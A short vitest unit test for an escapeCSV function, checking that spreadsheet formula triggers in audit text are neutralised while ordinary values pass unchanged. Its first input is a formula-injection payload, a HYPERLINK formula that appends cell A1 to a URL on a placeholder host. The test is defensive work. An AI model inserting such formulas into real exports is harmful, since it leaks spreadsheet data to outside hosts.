import { expect, it, vi } from "vitest";
vi.mock("../../database/db.js", () => ({ default: {} }));
import { escapeCSV } from "../../services/complianceService.js";

it("neutralizes formula-like audit text without changing ordinary cells", () => {
  expect(escapeCSV('=HYPERLINK("http://x/?"&A1,"ok")')).toBe(
    `"'=HYPERLINK(""http://x/?""&A1,""ok"")"`,
  );
  for (const start of ["+", "-", "@", "\t", "\r"])
    expect(escapeCSV(`${start}cmd`)).toBe(`"'${start}cmd"`);
  // Numbers (including negatives) are data, not formulas.
  expect(escapeCSV(-5)).toBe("-5");
  expect(escapeCSV("Pressure, high")).toBe('"Pressure, high"');
  expect(escapeCSV("plain")).toBe("plain");
  expect(escapeCSV(null)).toBe("");
});
